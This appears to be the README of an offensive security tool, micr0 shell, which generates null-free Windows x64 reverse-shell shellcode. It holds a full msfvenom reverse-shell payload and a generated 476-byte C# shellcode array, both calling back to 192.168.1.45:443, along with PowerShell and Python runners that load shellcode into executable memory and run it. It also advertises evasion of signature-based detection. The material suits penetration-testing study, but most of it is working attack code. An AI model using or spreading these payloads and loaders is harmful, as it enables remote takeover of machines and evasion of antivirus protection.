# micr0 shell
`micr0 shell` is a Python script that dynamically generates PIC Null-Free reverse shell shellcode. It is light, convenient, and fast. Generated shellcode can be `27 bytes` smaller than MSF's shellcode (Do not contain `0x00`) at most, depending on supplied shellcode options. Generated shellcode can also be used to evade signature-based detection, considering MSF's shellcode is used widely.

```Shellcode Generated by MSF
─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.45 LPORT=443 -f python -v shellcode -b "\x00"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 3 compatible encoders
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=7, char=0x00)
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 503 (iteration=0)
x64/xor chosen with final size 503
Payload size: 503 bytes
Final size of python file: 2811 bytes
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x97\xd2\x1e"
shellcode += b"\xc2\xf9\x8a\x16\xb4\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x6b\x9a\x9d\x26\x09"
shellcode += b"\x62\xd6\xb4\x97\xd2\x5f\x93\xb8\xda\x44\xe5"
shellcode += b"\xc1\x9a\x2f\x10\x9c\xc2\x9d\xe6\xf7\x9a\x95"
shellcode += b"\x90\xe1\xc2\x9d\xe6\xb7\x9a\x95\xb0\xa9\xc2"
shellcode += b"\x19\x03\xdd\x98\x53\xf3\x30\xc2\x27\x74\x3b"
shellcode += b"\xee\x7f\xbe\xfb\xa6\x36\xf5\x56\x1b\x13\x83"
shellcode += b"\xf8\x4b\xf4\x59\xc5\x93\x4f\x8a\x72\xd8\x36"
shellcode += b"\x3f\xd5\xee\x56\xc3\x29\x01\x96\x3c\x97\xd2"
shellcode += b"\x1e\x8a\x7c\x4a\x62\xd3\xdf\xd3\xce\x92\x72"
shellcode += b"\xc2\x0e\xf0\x1c\x92\x3e\x8b\xf8\x5a\xf5\xe2"
shellcode += b"\xdf\x2d\xd7\x83\x72\xbe\x9e\xfc\x96\x04\x53"
shellcode += b"\xf3\x30\xc2\x27\x74\x3b\x93\xdf\x0b\xf4\xcb"
shellcode += b"\x17\x75\xaf\x32\x6b\x33\xb5\x89\x5a\x90\x9f"
shellcode += b"\x97\x27\x13\x8c\x52\x4e\xf0\x1c\x92\x3a\x8b"
shellcode += b"\xf8\x5a\x70\xf5\x1c\xde\x56\x86\x72\xca\x0a"
shellcode += b"\xfd\x96\x02\x5f\x49\xfd\x02\x5e\xb5\x47\x93"
shellcode += b"\x46\x83\xa1\xd4\x4f\xee\xd6\x8a\x5f\x9b\xb8"
shellcode += b"\xd0\x5e\x37\x7b\xf2\x5f\x90\x06\x6a\x4e\xf5"
shellcode += b"\xce\x88\x56\x49\xeb\x63\x41\x4b\x68\x2d\x43"
shellcode += b"\x8b\x47\xfd\x65\x86\xc8\xe1\x2c\xc2\xf9\xcb"
shellcode += b"\x40\xfd\x1e\x34\x56\x43\x15\x2a\x17\xb4\x97"
shellcode += b"\x9b\x97\x27\xb0\x36\x14\xb4\x96\x69\xde\x6a"
shellcode += b"\xf8\xa7\x57\xe0\xde\x5b\xfa\x8e\x70\x7b\x57"
shellcode += b"\x0e\xdb\xa5\x38\xc5\x06\x5f\x5a\x3d\x7d\xba"
shellcode += b"\x1f\xc3\xf9\x8a\x4f\xf5\x2d\xfb\x9e\xa9\xf9"
shellcode += b"\x75\xc3\xe4\xc7\x9f\x2f\x0b\xb4\xbb\xd6\xfc"
shellcode += b"\x68\x12\x56\x4b\x3b\xc2\xe9\x74\xdf\x5b\xdf"
shellcode += b"\x83\x43\x60\x19\x6b\x77\x2d\xcb\x8a\x70\x4d"
shellcode += b"\x7c\xa4\xd6\x8a\x52\x4b\x1b\xc2\x9f\x4d\xd6"
shellcode += b"\x68\x87\x67\x8d\xeb\xe9\x61\xdf\x53\xda\x82"
shellcode += b"\xfb\x8a\x16\xfd\x2f\xb1\x73\xa6\xf9\x8a\x16"
shellcode += b"\xb4\x97\x93\x4e\x83\xa9\xc2\x9f\x56\xc0\x85"
shellcode += b"\x49\x8f\xc8\x4a\x7c\xb9\xce\x93\x4e\x20\x05"
shellcode += b"\xec\xd1\xf0\xb3\x86\x1f\xc3\xb1\x07\x52\x90"
shellcode += b"\x8f\x14\x1e\xaa\xb1\x03\xf0\xe2\xc7\x93\x4e"
shellcode += b"\x83\xa9\xcb\x46\xfd\x68\x12\x5f\x92\xb0\x75"
shellcode += b"\xde\xf9\x1e\x13\x52\x4b\x38\xcb\xac\xcd\x5b"
shellcode += b"\xed\x98\x3d\x2c\xc2\x27\x66\xdf\x2d\xd4\x49"
shellcode += b"\xf7\xcb\xac\xbc\x10\xcf\x7e\x3d\x2c\x31\xe6"
shellcode += b"\x01\x35\x84\x5f\x78\x5f\x1f\xab\x29\x68\x07"
shellcode += b"\x56\x41\x3d\xa2\x2a\xb2\xeb\xd8\x9e\x39\x19"
shellcode += b"\xff\x13\x0f\xd0\xc1\x6c\xad\x93\x8a\x4f\xf5"
shellcode += b"\x1e\x08\xe1\x17\xf9\x8a\x16\xb4"
```


## Background

## How to Use
### Install Keystone Engine
To generate shellcode from x64 assembly instructions in a Python script, `keystone` engine dependency is needed. Use `pip` to install Keystone Engine:

```python
pip install keystone-engine
```

### Script Usage
The user can supply the IP address, listening port, variable name, shellcode format(C/CSharp/python/powershell), shell type(powershell/cmd), and whether to execute generated shellcode(True/False).

Only the `IP address` must be specified to make the shellcode work well. The default port value is `443`, the default variable name is `buf`, the default language is `python`, and the default shell type is `cmd.exe`.

Users can choose to execute generated shellcode in this Python script, generated shellcode can also be saved in a binary file. By default, generated shellcode is `NOT EXECUTED` and `NOT SAVED` in a file.

### Simple Shellcode Runner
#### C
```c

```

#### CSharp
```csharp

```

#### PowerShell
```powershell
function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
     Equals('System.dll')
     }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
@($moduleName)), $functionName))
}


function getDelegateType {
    Param (
     [Parameter(Position = 0, Mandatory = $True)] [Type[]]
     $func, [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
[System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).
    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass,
    AutoClass', [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public',
[System.Reflection.CallingConventions]::Standard, $func).
     SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType,
$func). SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

$lpMem =[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = <SHELLCODE HERE>

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
$hThread =[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
```

#### Python
```python
import ctypes, struct


buf =  b"\x48\x31\...."  # SHELLCODE HERE
buf=bytearray(buf)

ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(buf)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

buf = (ctypes.c_char * len(buf)).from_buffer(buf)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),
                                     buf,
                                     ctypes.c_int(len(buf)))
print("Shellcode located at address %s" % hex(ptr))

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_uint64(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
```

## Known Issues
1. According to the supplied IP address, port, and shell type, micr0 shell dynamically generates Null-Free shellcode. I have considered most of the common situations that could generate Null bytes, however, I am aware that if the supplied IP address contains `.255` and `.0` at the same time, for instance, if the IP address is `192.168.0.255`, generated shellcode will contain Null byte. This type of IP address could be rare in practice, and eliminating Null byte for all IP addresses would add more complexity. Therefore, I do not intend to improve this part recently.

2. Regarding the port value, in theory, any port will not generate Null byte. However, due to the implementation of eliminating Null-byte, port `65280` is not usable.

## Future Plan


## Test Case

```cmd
─# python3 micr0shell.py --ip 192.168.1.45 --port 443 --type cmd --language csharp --variable sc --execution false --save True --output sc.bin

███╗░░░███╗██╗░█████╗░██████╗░░█████╗░  ░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
████╗░████║██║██╔══██╗██╔══██╗██╔══██╗  ██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██╔████╔██║██║██║░░╚═╝██████╔╝██║░░██║  ╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
██║╚██╔╝██║██║██║░░██╗██╔══██╗██║░░██║  ░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
██║░╚═╝░██║██║╚█████╔╝██║░░██║╚█████╔╝  ██████╔╝██║░░██║███████╗███████╗███████╗
╚═╝░░░░░╚═╝╚═╝░╚════╝░╚═╝░░╚═╝░╚════╝░  ╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝

Author: Senzee
Github Repository: https://github.com/senzee1984/micr0_shell
Description: Dynamically generate PIC Null-Free Reverse Shell Shellcode
Attention: In rare cases (.255 and .0 co-exist), generated shellcode could contain NULL bytes, E.G. when IP is 192.168.0.255


[+]Shellcode Settings:
******** IP Address: 192.168.1.45
******** Listening Port: 443
******** Language of desired shellcode runner: csharp
******** Shellcode array variable name: sc
******** Shell: cmd
******** Shellcode Execution: false
******** Save Shellcode to file: true


[+]Payload size: 476 bytes

[+]Shellcode format for C#

byte[] sc= new byte[476] {
0x48,0x31,0xd2,0x65,0x48,0x8b,0x42,0x60,0x48,0x8b,0x70,0x18,0x48,0x8b,0x76,0x20,0x4c,0x8b,0x0e,0x4d,
0x8b,0x09,0x4d,0x8b,0x49,0x20,0xeb,0x63,0x41,0x8b,0x49,0x3c,0x4d,0x31,0xff,0x41,0xb7,0x88,0x4d,0x01,
0xcf,0x49,0x01,0xcf,0x45,0x8b,0x3f,0x4d,0x01,0xcf,0x41,0x8b,0x4f,0x18,0x45,0x8b,0x77,0x20,0x4d,0x01,
0xce,0xe3,0x3f,0xff,0xc9,0x48,0x31,0xf6,0x41,0x8b,0x34,0x8e,0x4c,0x01,0xce,0x48,0x31,0xc0,0x48,0x31,
0xd2,0xfc,0xac,0x84,0xc0,0x74,0x07,0xc1,0xca,0x0d,0x01,0xc2,0xeb,0xf4,0x44,0x39,0xc2,0x75,0xda,0x45,
0x8b,0x57,0x24,0x4d,0x01,0xca,0x41,0x0f,0xb7,0x0c,0x4a,0x45,0x8b,0x5f,0x1c,0x4d,0x01,0xcb,0x41,0x8b,
0x04,0x8b,0x4c,0x01,0xc8,0xc3,0xc3,0x4c,0x89,0xcd,0x41,0xb8,0x8e,0x4e,0x0e,0xec,0xe8,0x8f,0xff,0xff,
0xff,0x49,0x89,0xc4,0x48,0x31,0xc0,0x66,0xb8,0x6c,0x6c,0x50,0x48,0xb8,0x57,0x53,0x32,0x5f,0x33,0x32,
0x2e,0x64,0x50,0x48,0x89,0xe1,0x48,0x83,0xec,0x20,0x4c,0x89,0xe0,0xff,0xd0,0x48,0x83,0xc4,0x20,0x49,
0x89,0xc6,0x49,0x89,0xc1,0x41,0xb8,0xcb,0xed,0xfc,0x3b,0x4c,0x89,0xcb,0xe8,0x55,0xff,0xff,0xff,0x48,
0x31,0xc9,0x66,0xb9,0x98,0x01,0x48,0x29,0xcc,0x48,0x8d,0x14,0x24,0x66,0xb9,0x02,0x02,0x48,0x83,0xec,
0x30,0xff,0xd0,0x48,0x83,0xc4,0x30,0x49,0x89,0xd9,0x41,0xb8,0xd9,0x09,0xf5,0xad,0xe8,0x2b,0xff,0xff,
0xff,0x48,0x83,0xec,0x30,0x48,0x31,0xc9,0xb1,0x02,0x48,0x31,0xd2,0xb2,0x01,0x4d,0x31,0xc0,0x41,0xb0,
0x06,0x4d,0x31,0xc9,0x4c,0x89,0x4c,0x24,0x20,0x4c,0x89,0x4c,0x24,0x28,0xff,0xd0,0x49,0x89,0xc4,0x48,
0x83,0xc4,0x30,0x49,0x89,0xd9,0x41,0xb8,0x0c,0xba,0x2d,0xb3,0xe8,0xf3,0xfe,0xff,0xff,0x48,0x83,0xec,
0x20,0x4c,0x89,0xe1,0x48,0x31,0xd2,0xb2,0x02,0x48,0x89,0x14,0x24,0x48,0x31,0xd2,0x66,0xba,0x01,0xbb,
0x48,0x89,0x54,0x24,0x02,0xba,0xc0,0xa8,0x01,0x2d,0x48,0x89,0x54,0x24,0x04,0x48,0x8d,0x14,0x24,0x4d,
0x31,0xc0,0x41,0xb0,0x16,0x4d,0x31,0xc9,0x48,0x83,0xec,0x38,0x4c,0x89,0x4c,0x24,0x20,0x4c,0x89,0x4c,
0x24,0x28,0x4c,0x89,0x4c,0x24,0x30,0xff,0xd0,0x48,0x83,0xc4,0x38,0x49,0x89,0xe9,0x41,0xb8,0x72,0xfe,
0xb3,0x16,0xe8,0x99,0xfe,0xff,0xff,0x48,0xba,0x9c,0x92,0x9b,0xd1,0x9a,0x87,0x9a,0xff,0x48,0xf7,0xd2,
0x52,0x48,0x89,0xe2,0x41,0x54,0x41,0x54,0x41,0x54,0x48,0x31,0xc9,0x66,0x51,0x51,0x51,0xb1,0xff,0x66,
0xff,0xc1,0x66,0x51,0x48,0x31,0xc9,0x66,0x51,0x66,0x51,0x51,0x51,0x51,0x51,0x51,0x51,0xb1,0x68,0x51,
0x48,0x89,0xe7,0x48,0x89,0xe1,0x48,0x83,0xe9,0x20,0x51,0x57,0x48,0x31,0xc9,0x51,0x51,0x51,0x48,0xff,
0xc1,0x51,0xfe,0xc9,0x51,0x51,0x51,0x51,0x49,0x89,0xc8,0x49,0x89,0xc9,0xff,0xd0};


Generated shellcode successfully saved in file sc.bin
```
